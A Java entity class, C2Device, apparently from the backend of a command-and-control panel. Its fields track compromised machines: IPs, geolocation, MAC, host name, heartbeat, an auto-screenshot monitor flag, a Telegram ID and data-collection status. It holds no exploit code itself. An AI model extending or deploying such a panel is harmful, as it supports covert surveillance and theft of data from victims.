package com.yupi.springbootinit.model.entity;

import com.baomidou.mybatisplus.annotation.*;
import java.io.Serializable;
import java.util.Date;
import lombok.Data;

/**
 * C2 Device
 */
@TableName(value = "c2_device")
@Data
public class C2Device implements Serializable {
    @TableId(type = IdType.AUTO)
    private Long id;

    @TableField("uuid")
    private String uuid;

    @TableField("internal_ip")
    private String internalIp;

    @TableField("external_ip")
    private String externalIp;

    @TableField("country")
    private String country;

    @TableField("region")
    private String region;

    @TableField("city")
    private String city;

    @TableField("isp")
    private String isp;

    @TableField("mac_address")
    private String macAddress;

    @TableField("host_name")
    private String hostName;

    @TableField("os")
    private String os;

    @TableField("heartbeat_interval")
    private Integer heartbeatInterval;

    /**
     * Is Auto Screenshot Monitor On (0-off, 1-on)
     */
    @TableField("is_monitor_on")
    private Integer isMonitorOn;

    /**
     * Current Telegram ID (tgid)
     */
    @TableField("current_tg_id")
    private String currentTgId;

    /**
     * Data Collection Status (e.g., Collecting, Uploading, Done)
     */
    @TableField("data_status")
    private String dataStatus;

    @TableField("last_seen")
    private Date lastSeen;

    @TableField("create_time")
    private Date createTime;

    @TableField("update_time")
    private Date updateTime;

    @TableLogic
    @TableField("is_delete")
    private Integer isDelete;

    @TableField(exist = false)
    private static final long serialVersionUID = 1L;

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    public String getUuid() {
        return uuid;
    }

    public void setUuid(String uuid) {
        this.uuid = uuid;
    }

    public String getInternalIp() {
        return internalIp;
    }

    public void setInternalIp(String internalIp) {
        this.internalIp = internalIp;
    }

    public String getExternalIp() {
        return externalIp;
    }

    public void setExternalIp(String externalIp) {
        this.externalIp = externalIp;
    }

    public String getMacAddress() {
        return macAddress;
    }

    public void setMacAddress(String macAddress) {
        this.macAddress = macAddress;
    }

    public String getHostName() {
        return hostName;
    }

    public void setHostName(String hostName) {
        this.hostName = hostName;
    }

    public String getOs() {
        return os;
    }

    public void setOs(String os) {
        this.os = os;
    }

    public Integer getHeartbeatInterval() {
        return heartbeatInterval;
    }

    public void setHeartbeatInterval(Integer heartbeatInterval) {
        this.heartbeatInterval = heartbeatInterval;
    }

    public Integer getIsMonitorOn() {
        return isMonitorOn;
    }

    public void setIsMonitorOn(Integer isMonitorOn) {
        this.isMonitorOn = isMonitorOn;
    }

    public String getDataStatus() {
        return dataStatus;
    }

    public void setDataStatus(String dataStatus) {
        this.dataStatus = dataStatus;
    }

    public Date getLastSeen() {
        return lastSeen;
    }

    public void setLastSeen(Date lastSeen) {
        this.lastSeen = lastSeen;
    }

    public Date getCreateTime() {
        return createTime;
    }

    public void setCreateTime(Date createTime) {
        this.createTime = createTime;
    }

    public Date getUpdateTime() {
        return updateTime;
    }

    public void setUpdateTime(Date updateTime) {
        this.updateTime = updateTime;
    }

    public Integer getIsDelete() {
        return isDelete;
    }

    public void setIsDelete(Integer isDelete) {
        this.isDelete = isDelete;
    }
}
